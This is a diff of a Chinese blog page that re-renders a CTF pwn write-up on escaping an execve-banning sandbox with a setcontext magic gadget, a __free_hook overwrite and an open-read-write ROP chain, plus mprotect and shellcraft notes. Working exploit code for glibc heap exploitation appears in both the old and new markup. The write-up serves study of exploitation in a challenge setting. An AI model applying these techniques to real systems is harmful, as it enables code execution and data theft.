@@ -216,6 +216,28 @@
 
           
           
+          <li>
+            <a href="/about/">
+              
+              关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
           
           
           <li>
@@ -230,31 +252,9 @@
           
           
           <li>
-            <a href="/about/">
-              
-              关于
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
             <a href="/categories/">
               
               分类
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/tags/">
-              
-              标签
               
               
             </a>
@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">600</span> In Total
+              Words <span class="post-count">602</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -420,74 +420,78 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1>Setcontext与Magic-Gadget</h1>
+        <h1 id="setcontext与magic-gadget">Setcontext与Magic-Gadget</h1>
 <p>题目在LargebinsAttact与TcachebinsPosioning中基本一样，只是开了沙箱ban了execve。</p>
-<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103173735695.png" alt="image-20231103173735695"></p>
+<figure>
+<img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103173735695.png" alt="image-20231103173735695">
+<figcaption aria-hidden="true">image-20231103173735695</figcaption>
+</figure>
 <p>考虑使用<code>orw</code>，在上一篇的基础上来继续探究如何<code>orw</code></p>
 <h2 id="方法1">方法1</h2>
 <p>考虑使用setcontext，栈迁移rop --glibc2.32</p>
 <p>首先先来看<code>setcontext</code>，以<code>rdx</code>为基地址设置寄存器。注意这里从<code>setcontext + 61</code>，前面的指令容易卡死。</p>
-<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174201861.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174201861.png"></p>
 <p>由于我们只能控制<code>rdi</code>指向的值，需要找Magic-Gadget来转换为<code>rdx</code>，这里用rop-gadget找了一个。</p>
-<pre><code class="hljs assembly">&#x27;&#x27;&#x27;
+<pre class="assembly"><code>&#39;&#39;&#39;
 0x000014b760
 mov rdx, qword ptr [rdi + 8] ;
 mov qword ptr [rsp], rax ;
 call qword ptr [rdx + 0x20]
-&#x27;&#x27;&#x27;</code></pre>
+&#39;&#39;&#39;</code></pre>
 <p>这样就设置了rdx，还完成了跳转。</p>
-<p>调试的时候发现这里还有push rcx的动作，所以rcx设置了最后跳转的值，需要与设置的rsp相搭配完成栈迁移rop</p>
-<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174523710.png" alt></p>
-<p>而后再写一下orw的值，存进新开辟的堆块里。使用rop.base设置rop的地址，方便工具找字符串。PS 太优雅了！</p>
-<pre><code class="hljs python">orw = ROP(libc)
-orw.base = orw_addr + <span class="hljs-number">0x8</span> <span class="hljs-comment">#调试的偏移</span>
-orw.<span class="hljs-built_in">open</span>(<span class="hljs-string">b&#x27;flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
-orw.read(<span class="hljs-number">3</span>,heap_base+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x20</span>)
-orw.write(<span class="hljs-number">1</span>,heap_base+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x20</span>)</code></pre>
+<p>调试的时候发现这里还有push
+rcx的动作，所以rcx设置了最后跳转的值，需要与设置的rsp相搭配完成栈迁移rop</p>
+<p><img src="/cn/Sagiring_markdown/Setcontext%E4%B8%8EMagic-Gadget/image-20231103174523710.png"></p>
+<p>而后再写一下orw的值，存进新开辟的堆块里。使用rop.base设置rop的地址，方便工具找字符串。PS
+太优雅了！</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>orw <span class="op">=</span> ROP(libc)</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>orw.base <span class="op">=</span> orw_addr <span class="op">+</span> <span class="bn">0x8</span> <span class="co">#调试的偏移</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>orw.<span class="bu">open</span>(<span class="st">b&#39;flag&#39;</span>,<span class="dv">0</span>,<span class="dv">0</span>)</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>orw.read(<span class="dv">3</span>,heap_base<span class="op">+</span><span class="bn">0x200</span>,<span class="bn">0x20</span>)</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>orw.write(<span class="dv">1</span>,heap_base<span class="op">+</span><span class="bn">0x200</span>,<span class="bn">0x20</span>)</span></code></pre></div>
 <p>这里贴一下这部分的exp</p>
-<pre><code class="hljs python">add(<span class="hljs-number">15</span>,<span class="hljs-number">0x900</span>)
-rdi_context_addr = heap_base + <span class="hljs-number">0x3290</span> + <span class="hljs-number">0x10</span>
-orw_addr = heap_base + <span class="hljs-number">0x3ba0</span>
-orw = ROP(libc)
-orw.base = orw_addr + <span class="hljs-number">0x8</span>
-orw.<span class="hljs-built_in">open</span>(<span class="hljs-string">b&#x27;flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)
-orw.read(<span class="hljs-number">3</span>,heap_base+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x20</span>)
-orw.write(<span class="hljs-number">1</span>,heap_base+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x20</span>)
-info(orw.dump())
-edit(<span class="hljs-number">15</span>,orw.chain()[<span class="hljs-number">8</span>:])
-
-
-
-gadget = libc.address + <span class="hljs-number">0x000014b760</span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-<span class="hljs-string">0x000014b760</span>
-<span class="hljs-string">mov rdx, qword ptr [rdi + 8] ;</span>
-<span class="hljs-string">mov qword ptr [rsp], rax ;</span>
-<span class="hljs-string">call qword ptr [rdx + 0x20]</span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-rop = ROP(libc)
-
-rdi_context = p64(<span class="hljs-number">0</span>) + p64(rdi_context_addr) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">61</span>)
-rdi_context += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">15</span> + p64(orw_addr+<span class="hljs-number">0x10</span>) + orw.chain()[:<span class="hljs-number">8</span>]
-<span class="hljs-comment"># rop.raw(rdi_context)</span>
-info(rop.dump())
-
-edit(<span class="hljs-number">14</span>,p64(gadget))
-edit(<span class="hljs-number">13</span>,rdi_context) <span class="hljs-comment">#rdi的值</span>
-show_addr(<span class="hljs-string">&#x27;__free_hook&#x27;</span>,libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])
-
-pause()
-delete(<span class="hljs-number">13</span>)
-r.interactive()
-</code></pre>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">15</span>,<span class="bn">0x900</span>)</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>rdi_context_addr <span class="op">=</span> heap_base <span class="op">+</span> <span class="bn">0x3290</span> <span class="op">+</span> <span class="bn">0x10</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>orw_addr <span class="op">=</span> heap_base <span class="op">+</span> <span class="bn">0x3ba0</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>orw <span class="op">=</span> ROP(libc)</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>orw.base <span class="op">=</span> orw_addr <span class="op">+</span> <span class="bn">0x8</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>orw.<span class="bu">open</span>(<span class="st">b&#39;flag&#39;</span>,<span class="dv">0</span>,<span class="dv">0</span>)</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>orw.read(<span class="dv">3</span>,heap_base<span class="op">+</span><span class="bn">0x200</span>,<span class="bn">0x20</span>)</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>orw.write(<span class="dv">1</span>,heap_base<span class="op">+</span><span class="bn">0x200</span>,<span class="bn">0x20</span>)</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>info(orw.dump())</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">15</span>,orw.chain()[<span class="dv">8</span>:])</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>gadget <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x000014b760</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="co">&#39;&#39;&#39;</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="co">0x000014b760</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="co">mov rdx, qword ptr [rdi + 8] ;</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="co">mov qword ptr [rsp], rax ;</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="co">call qword ptr [rdx + 0x20]</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="co">&#39;&#39;&#39;</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>rop <span class="op">=</span> ROP(libc)</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>rdi_context <span class="op">=</span> p64(<span class="dv">0</span>) <span class="op">+</span> p64(rdi_context_addr) <span class="op">+</span> p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">2</span> <span class="op">+</span>p64(libc.sym[<span class="st">&#39;setcontext&#39;</span>]<span class="op">+</span><span class="dv">61</span>)</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>rdi_context <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="op">*</span> <span class="dv">15</span> <span class="op">+</span> p64(orw_addr<span class="op">+</span><span class="bn">0x10</span>) <span class="op">+</span> orw.chain()[:<span class="dv">8</span>]</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="co"># rop.raw(rdi_context)</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>info(rop.dump())</span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">14</span>,p64(gadget))</span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>edit(<span class="dv">13</span>,rdi_context) <span class="co">#rdi的值</span></span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>show_addr(<span class="st">&#39;__free_hook&#39;</span>,libc.sym[<span class="st">&#39;__free_hook&#39;</span>])</span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>pause()</span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">13</span>)</span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
 <h2 id="方法二">方法二</h2>
 <p>使用mprotect函数修改出一块<code>rwx</code>的地址，然后再写入<code>orw</code>的shellcode，</p>
 <p>这里顺便贴一下直接见到的shellcraft的用法，之后可以研究一下。应该也有比较方便的调用方法</p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> pwnlib.shellcraft <span class="hljs-keyword">as</span> sc
-asm(sc.setregs(&#123;<span class="hljs-string">&#x27;rax&#x27;</span>:SYS_ptrace,<span class="hljs-string">&#x27;rsi&#x27;</span>:<span class="hljs-string">&#x27;r14&#x27;</span>,<span class="hljs-string">&#x27;rdi&#x27;</span>:<span class="hljs-number">0x11</span>,<span class="hljs-string">&#x27;rcx&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;rdx&#x27;</span>:<span class="hljs-number">0</span>&#125;)+\<span class="hljs-string">&#x27;syscall\n&#x27;</span>)
-asm(sc.pushstr(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)+sc.syscall(<span class="hljs-string">&#x27;SYS_getpid&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
-asm(sc.mov(<span class="hljs-string">&#x27;rdi&#x27;</span>,<span class="hljs-string">&#x27;rax&#x27;</span>))
-asm(<span class="hljs-string">&quot;lea rsi,[rip]\n&quot;</span>)<span class="hljs-comment">#mov rip方法</span></code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> pwnlib.shellcraft <span class="im">as</span> sc</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>asm(sc.setregs(&#123;<span class="st">&#39;rax&#39;</span>:SYS_ptrace,<span class="st">&#39;rsi&#39;</span>:<span class="st">&#39;r14&#39;</span>,<span class="st">&#39;rdi&#39;</span>:<span class="bn">0x11</span>,<span class="st">&#39;rcx&#39;</span>:<span class="dv">0</span>,<span class="st">&#39;rdx&#39;</span>:<span class="dv">0</span>&#125;)<span class="op">+</span>\<span class="st">&#39;syscall</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>asm(sc.pushstr(<span class="st">&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="op">+</span>sc.syscall(<span class="st">&#39;SYS_getpid&#39;</span>,<span class="st">&#39;rsp&#39;</span>,<span class="dv">0</span>,<span class="dv">0</span>))</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>asm(sc.mov(<span class="st">&#39;rdi&#39;</span>,<span class="st">&#39;rax&#39;</span>))</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>asm(<span class="st">&quot;lea rsi,[rip]</span><span class="ch">\n</span><span class="st">&quot;</span>)<span class="co">#mov rip方法</span></span></code></pre></div>
 <p>找到一个magic-gadget修改rbp然后leave-ret迁移过去，再<code>orw</code>，可以直接orw也不用写shellcode。</p>
 <h2 id="总结一下">总结一下</h2>
 <p>两种方法都还算简便易用，关键是找magic-gadget，有合适的就可以打。</p>
@@ -640,7 +644,7 @@ asm(<span class="hljs-string">&quot;lea rsi,[rip]\n&quot;</span>)<span class="hl
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Setcontext与Magic-Gadget</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">方法1</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">方法二</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">总结一下</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#setcontext%E4%B8%8Emagic-gadget"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Setcontext与Magic-Gadget</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">方法1</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">方法二</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">总结一下</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -1163,6 +1167,14 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
 		<!-- 代码块收缩 -->
 		<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
 		<!-- 代码块折行 -->
+		<!-- <script src="/libs/highlight/highlight.min.js"></script> -->
+<!-- 
+		<script>
+		// hljs.debugMode()
+		// hljs.highlightAll();
+
+		</script> -->
+
 		<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 		
